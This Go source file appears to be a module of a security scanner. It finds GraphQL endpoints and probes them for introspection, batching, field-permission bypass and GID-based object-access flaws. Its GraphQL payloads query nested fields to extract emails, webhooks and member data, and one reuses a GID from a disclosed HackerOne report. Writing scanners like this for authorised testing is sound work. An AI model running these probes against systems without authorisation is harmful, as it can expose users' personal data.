package graphql

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/areksaxyz/bhyakugan/internal/core"
	"github.com/areksaxyz/bhyakugan/internal/payloadrepo"
	"github.com/areksaxyz/bhyakugan/internal/utils"
)

var GraphQLEndpoints = []string{
	"/graphql",
	"/graphiql",
	"/api/graphql",
	"/v1/graphql",
	"/v1/graphiql",
	"/graphql/console",
	"/explorer",
}

func mergedGraphQLEndpoints() []string {
	endpoints := append([]string{}, GraphQLEndpoints...)
	seen := make(map[string]bool, len(endpoints))
	for _, endpoint := range endpoints {
		seen[endpoint] = true
	}

	extra := payloadrepo.LoadRepoLines(32,
		"discovery/graphql-endpoints.txt",
		"graphql-endpoints.txt",
	)
	for _, raw := range extra {
		path := normalizeGraphQLEndpoint(raw)
		if path == "" || seen[path] {
			continue
		}
		seen[path] = true
		endpoints = append(endpoints, path)
	}
	return endpoints
}

func mergedGraphQLParams() []string {
	params := []string{"query", "operationName", "variables"}
	seen := make(map[string]bool, len(params))
	for _, param := range params {
		seen[strings.ToLower(param)] = true
	}

	extra := payloadrepo.LoadRepoLines(16,
		"discovery/graphql-params.txt",
		"graphql-params.txt",
	)
	for _, raw := range extra {
		param := strings.TrimSpace(raw)
		if param == "" {
			continue
		}
		lower := strings.ToLower(param)
		if seen[lower] {
			continue
		}
		seen[lower] = true
		params = append(params, param)
	}
	return params
}

func mergedGraphQLContentTypes() []string {
	contentTypes := []string{"application/json", "application/graphql"}
	seen := make(map[string]bool, len(contentTypes))
	for _, contentType := range contentTypes {
		seen[strings.ToLower(contentType)] = true
	}

	extra := payloadrepo.LoadRepoLines(16,
		"verify/graphql-safe-probes.txt",
	)
	for _, raw := range extra {
		value := strings.ToLower(strings.TrimSpace(raw))
		if !strings.HasPrefix(value, "application/") || seen[value] {
			continue
		}
		seen[value] = true
		contentTypes = append(contentTypes, value)
	}
	return contentTypes
}

func isLikelyGraphQLTarget(raw string, endpoints, params []string) bool {
	parsed, err := url.Parse(strings.TrimSpace(raw))
	if err != nil {
		return false
	}

	trimmedPath := strings.TrimSuffix(parsed.Path, "/")
	for _, endpoint := range endpoints {
		if strings.HasSuffix(trimmedPath, strings.TrimSuffix(endpoint, "/")) {
			return true
		}
	}

	query := parsed.Query()
	for _, param := range params {
		if _, ok := query[param]; ok {
			return true
		}
	}
	return false
}

func normalizeGraphQLEndpoint(raw string) string {
	path := strings.TrimSpace(raw)
	if path == "" {
		return ""
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return path
}

// Scan checks for GraphQL endpoints and misconfigurations
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	var wg sync.WaitGroup
	endpoints := mergedGraphQLEndpoints()
	params := mergedGraphQLParams()

	baseURLTrim := strings.TrimSuffix(baseURL, "/")
	if isLikelyGraphQLTarget(baseURL, endpoints, params) {
		wg.Add(1)
		go func() {
			defer wg.Done()
			checkEndpoint(baseURL, client, onFound)
		}()
	}

	// 1. Endpoint Discovery
	for _, path := range endpoints {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()

			// Skip if it would result in the same URL as baseURL
			target := baseURL
			if !strings.HasSuffix(target, "/") {
				target += "/"
			}
			targetPath := strings.TrimPrefix(p, "/")

			// Avoid double appending (e.g. /graphql/graphql)
			if strings.HasSuffix(baseURLTrim, "/"+targetPath) || baseURLTrim == targetPath {
				return
			}

			checkEndpoint(target+targetPath, client, onFound)
		}(path)
	}

	wg.Wait()
}

func checkEndpoint(url string, client *http.Client, onFound func(core.Finding)) {
	// Step 1: TCP Connection & HTTP Request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}
	utils.SetDefaultHeaders(req, url)
	resp, err := client.Do(req)

	// Rule 1: Connection Refused = Silent Discard
	errType := utils.ClassifyError(err)
	if errType == "refused" {
		return
	}
	// Rule 2: Separate Failures
	if errType == "timeout" {
		return
	}
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Rule 3: STRICT 3-STEP VALIDATION
	// 1. Must be 200 OK (or 400 for Bad Request if body confirms)
	if resp.StatusCode != 200 && resp.StatusCode != 400 {
		return
	}

	// 2. Content-Type Check
	contentType := strings.ToLower(resp.Header.Get("Content-Type"))
	validContentType := false
	for _, allowed := range mergedGraphQLContentTypes() {
		if strings.Contains(contentType, strings.ToLower(allowed)) {
			validContentType = true
			break
		}
	}

	if !validContentType {
		// Exception: GraphiQL HTML interfaces
		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		bodyStr := string(body)
		if strings.Contains(strings.ToLower(bodyStr), "graphiql") || strings.Contains(strings.ToLower(bodyStr), "graphql playground") {
			// Valid GraphiQL Interface
			fmt.Printf("[+] FOUND GraphiQL Interface: %s\n", url)
			onFound(core.Finding{
				Type:       "GraphQL Interface",
				Target:     url,
				Detail:     "GraphiQL or Playground UI detected.",
				Severity:   "Info",
				Confidence: core.ConfidenceProbable,
			})
			// Probe Introspection/Batching even if it's UI
			checkIntrospection(url, client, onFound)
			checkBatching(url, client, onFound)
			checkGidBOLA(url, client, onFound)
		}
		return
	}

	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	bodyStr := string(body)

	isGraphQL := false
	if strings.Contains(bodyStr, `{"data":`) {
		isGraphQL = true
	} else if strings.Contains(bodyStr, `{"errors":[`) && (strings.Contains(bodyStr, "Syntax Error") || strings.Contains(bodyStr, "Cannot query field") || strings.Contains(bodyStr, "introspection")) {
		isGraphQL = true
	} else if strings.Contains(bodyStr, "__schema") {
		isGraphQL = true
	}

	if isGraphQL {
		fmt.Printf("[+] FOUND Valid GraphQL Endpoint: %s\n", url)
		onFound(core.Finding{
			Type:       "GraphQL Endpoint",
			Target:     url,
			Detail:     "Valid GraphQL endpoint confirmed (JSON response with GraphQL structure).",
			Severity:   "Info",
			Confidence: core.ConfidenceConfirmed,
		})
		checkIntrospection(url, client, onFound)
		checkBatching(url, client, onFound)
		checkGidBOLA(url, client, onFound)
		checkFieldBypass(url, client, onFound)
	}
}

func checkFieldBypass(url string, client *http.Client, onFound func(core.Finding)) {
	// Inspired by "$1,500 PII Leak via GraphQL Field-Level Permission Bypass"
	// We test for common nested bypasses: Parent -> Child instead of direct ID query.
	queries := []struct {
		Name    string
		Payload string
	}{
		{
			Name:    "Nested Project/Webhook Bypass",
			Payload: `{"query":"{organizations{projects{name,webhooks{id,url}}}}"}`,
		},
		{
			Name:    "Duplicate/Alias Field Bypass (suggestedCollaborators)",
			Payload: `{"query":"{organizations{projects{suggestedCollaborators{id,email,role}}}}"}`,
		},
		{
			Name:    "Direct Member Leak",
			Payload: `{"query":"{organizations{members{id,email,username}}}"}`,
		},
	}

	for _, q := range queries {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(q.Payload)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		utils.SetDefaultHeaders(req, url)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		bodyStr := string(body)

		// Check for successful data retrieval of sensitive-looking fields
		if strings.Contains(bodyStr, `"data":`) && !strings.Contains(bodyStr, `"errors":`) {
			isVulnerable := false
			detail := ""

			if strings.Contains(bodyStr, `"email":`) || strings.Contains(bodyStr, `"webhooks":`) {
				isVulnerable = true
				detail = fmt.Sprintf("Sensitive PII/Config leaked via nested query (%s).", q.Name)
			} else if strings.Contains(bodyStr, `"suggestedCollaborators":`) && !strings.Contains(bodyStr, `"suggestedCollaborators":null`) {
				isVulnerable = true
				detail = "PII Leak via unauthenticated suggestedCollaborators alias."
			}

			if isVulnerable {
				fmt.Printf("[!] HIGH: GraphQL Field Bypass detected at %s (%s)\n", url, q.Name)
				onFound(core.Finding{
					Type:       "GraphQL Permission Bypass",
					Target:     url,
					Detail:     detail + " Response preview: " + utils.Truncate(bodyStr, 200),
					Severity:   "High",
					Confidence: core.ConfidenceConfirmed,
				})
			}
		}
	}
}

func checkGidBOLA(url string, client *http.Client, onFound func(core.Finding)) {
	// Inspired by HackerOne #1618347: Disclosing PolicyPageAssetGroup via /graphql gid://...
	// We test for common GID patterns that might be vulnerable to BOLA/IDOR without auth.
	queries := []struct {
		Name    string
		Payload string
	}{
		{
			Name:    "HackerOne GID BOLA (PolicyPageAssetGroup)",
			Payload: `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}`,
		},
		{
			Name:    "Generic GID BOLA (User)",
			Payload: `{"query":"{node(id:\"gid://app/User/1\"){... on User{id,email,username}}}"}`,
		},
	}

	for _, q := range queries {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(q.Payload)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		utils.SetDefaultHeaders(req, url)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		bodyStr := string(body)

		// If we get "data" and "node" without errors, it's likely a BOLA/IDOR
		if strings.Contains(bodyStr, `"data":`) && strings.Contains(bodyStr, `"node":`) && !strings.Contains(bodyStr, `"errors":`) {
			// Double check if it actually returned an object
			if !strings.Contains(bodyStr, `"node":null`) {
				fmt.Printf("[!] CRITICAL: GraphQL GID BOLA detected at %s (%s)\n", url, q.Name)
				onFound(core.Finding{
					Type:       "GraphQL BOLA",
					Target:     url,
					Detail:     fmt.Sprintf("Unauthorized object disclosure via GID (%s). Response: %s", q.Name, bodyStr),
					Severity:   "Critical",
					Confidence: core.ConfidenceConfirmed,
				})
			}
		}
	}
}

func checkIntrospection(url string, client *http.Client, onFound func(core.Finding)) {
	// Basic Introspection Query
	query := `{"query": "query IntrospectionQuery { __schema { queryType { name } } }"}`

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(query)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	utils.SetDefaultHeaders(req, url)

	resp, err := client.Do(req)

	// Rule 1: Connection Refused = Silent Discard
	errType := utils.ClassifyError(err)
	if errType == "refused" {
		return
	}
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	bodyStr := string(body)

	if strings.Contains(bodyStr, "__schema") && strings.Contains(bodyStr, "queryType") {
		fmt.Printf("[!] POSITIVE MATCH: GraphQL Introspection Enabled at %s\n", url)
		onFound(core.Finding{
			Type:       "GraphQL Introspection",
			Target:     url,
			Detail:     "Introspection is enabled. This is configuration exposure only; no auth bypass or data exposure proof was observed.",
			Severity:   "Info",
			Confidence: core.ConfidenceProbable,
		})
	}
}

func checkBatching(url string, client *http.Client, onFound func(core.Finding)) {
	// Array Batching Attack Check
	query := `[{"query": "query { __typename }"}, {"query": "query { __typename }"}]`

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(query)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	utils.SetDefaultHeaders(req, url)

	resp, err := client.Do(req)

	// Rule 1: Connection Refused = Silent Discard
	errType := utils.ClassifyError(err)
	if errType == "refused" {
		return
	}
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	bodyStr := string(body)

	// If response is an array [...] with multiple results, batching is enabled
	if strings.HasPrefix(strings.TrimSpace(bodyStr), "[") && strings.Contains(bodyStr, "__typename") {
		fmt.Printf("[!] POSITIVE MATCH: GraphQL Batching Enabled at %s\n", url)
		onFound(core.Finding{
			Type:       "GraphQL Batching",
			Target:     url,
			Detail:     "Batching enabled (may amplify brute-force or DoS attempts; exploit chain not validated).",
			Severity:   "Low",
			Confidence: core.ConfidenceProbable,
		})
	}
}
